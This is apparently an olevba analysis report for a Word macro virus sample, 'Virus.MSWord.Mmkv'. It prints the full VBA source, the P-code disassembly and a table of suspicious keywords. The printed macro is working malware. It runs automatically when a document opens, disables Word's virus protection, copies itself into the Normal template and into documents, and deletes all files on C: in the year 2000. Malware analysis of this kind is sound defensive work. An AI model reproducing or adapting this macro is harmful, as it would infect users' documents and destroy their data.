olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mmkv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mmkv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MMKV.bas 
in file: Virus.MSWord.Mmkv - OLE stream: 'Macros/VBA/MMKV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WinDir As String
Public DataDot As Boolean

Sub AutoExec()
AutoOpen
End Sub
Sub AutoOpen()
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK-Words By MMK 1999"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Copy_Tmp
Copy_Vir
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FileOpen()
fa = Dialogs(wdDialogFileOpen).Show
If fa = "" Then GoTo asa
Copy_Vir
asa:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Find_Win
NormalTemplate.VBProject.VBComponents("MMKV").Export WinDir + "\SYSTEM\" + "WINMK.SYS"
Application.OrganizerDelete NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import WinDir + "\SYSTEM\" + "WINMK.SYS"
Kill WinDir + "\SYSTEM\" + "WINMK.SYS"
End Sub
Sub FileSave()
If ActiveDocument.FullName = "" Then Dialogs(wdDialogFileSaveAs).Show
Copy_Vir
ActiveDocument.Save
End Sub
Sub viewvbcode()
End Sub
Sub Find_Win()
Close
Dim WD As String
On Error GoTo Err_F
F = FreeFile
Open "c:\msdos.sys" For Input As #F
Do Until EOF(F)
Line Input #F, WD
If Left(UCase(WD), 7) = "WINDIR=" Then
    L = Len(WD)
    WinDir = UCase$(Mid$(WD, 8, L))
End If
Loop
GoTo END_S
Err_F:
WinDir = ""
END_S:
Close #F
End Sub
Sub Copy_Vir()
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "MMKV", wdOrganizerObjectProjectItems
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
INFECTED:
End Sub
Sub Copy_Tmp()
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
INFECTED:
Copy_Vir
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Mmkv - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mmkv
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MMKV - 5384 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn WinDir (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn DataDot (As Boolean)
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoExec())
' Line #4:
' 	ArgsCall AutoOpen 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "c:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000E "Welcome To Y2K"
' 	LitDI2 0x0000 
' 	LitStr 0x0014 "MK-Words By MMK 1999"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	ArgsCall Copy_Tmp 0x0000 
' Line #13:
' 	ArgsCall Copy_Vir 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub FileSaveAs())
' Line #16:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #19:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub FileOpen())
' Line #22:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St fa 
' Line #23:
' 	Ld fa 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo asa 
' 	EndIf 
' Line #24:
' 	ArgsCall Copy_Vir 0x0000 
' Line #25:
' 	Label asa 
' Line #26:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub ToolsMacro())
' Line #29:
' 	EndSub 
' Line #30:
' 	ArgsCall Find_Win 0x0000 
' Line #31:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	LitStr 0x0004 "MMKV"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #33:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Display 
' 	While 
' Line #34:
' 	Wend 
' Line #35:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #36:
' 	Ld WinDir 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Add 
' 	LitStr 0x0009 "WINMK.SYS"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub FileSave())
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #40:
' 	ArgsCall Copy_Vir 0x0000 
' Line #41:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub viewvbcode())
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub Find_Win())
' Line #46:
' 	CloseAll 
' Line #47:
' 	Dim 
' 	VarDefn WD (As String)
' Line #48:
' 	OnError Err_F 
' Line #49:
' 	Ld Friend 
' 	St False 
' Line #50:
' 	LitStr 0x000C "c:\msdos.sys"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #51:
' 	Ld False 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #52:
' 	Ld False 
' 	Ld WD 
' 	LineInput 
' Line #53:
' 	Ld WD 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld WD 
' 	FnLen 
' 	St L 
' Line #55:
' 	Ld WD 
' 	LitDI2 0x0008 
' 	Ld L 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	St WinDir 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Loop 
' Line #58:
' 	GoTo END_S 
' Line #59:
' 	Label Err_F 
' Line #60:
' 	LitStr 0x0000 ""
' 	St WinDir 
' Line #61:
' 	Label END_S 
' Line #62:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub Copy_Vir())
' Line #65:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #66:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "MMKV"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo INFECTED 
' 	EndIf 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #69:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #70:
' 	LitStr 0x0019 "MK-Words (V1) By MMK 1999"
' 	MemStWith Comments 
' Line #71:
' 	ArgsMemCallWith Execute 0x0000 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	Label INFECTED 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub Copy_Tmp())
' Line #77:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #78:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "MMKV"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo INFECTED 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0004 "MMKV"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #81:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #82:
' 	LitStr 0x0019 "MK-Words (V1) By MMK 1999"
' 	MemStWith Comments 
' Line #83:
' 	ArgsMemCallWith Execute 0x0000 
' Line #84:
' 	EndWith 
' Line #85:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	Label INFECTED 
' Line #87:
' 	ArgsCall Copy_Vir 0x0000 
' Line #88:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #89:
' 	LitStr 0x0019 "MK-Words (V1) By MMK 1999"
' 	MemStWith Comments 
' Line #90:
' 	ArgsMemCallWith Execute 0x0000 
' Line #91:
' 	EndWith 
' Line #92:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #93:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

